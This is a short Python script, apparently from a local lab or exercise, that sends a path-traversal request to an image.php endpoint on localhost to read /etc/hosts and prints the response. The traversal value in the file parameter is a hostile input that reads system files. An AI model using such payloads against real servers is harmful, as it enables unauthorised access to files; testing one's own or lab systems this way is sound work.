import requests


def send_request(session):
    url = "http://localhost:1337/image.php?file=../../../../../etc/hosts"

    response = session.get(url)

    print(response.status_code, response.content, end="n")


def main():
    # одна сессия на все запросы (аналог ClientSession)
    with requests.Session() as session:
        send_request(session)


if __name__ == "__main__":
    main()
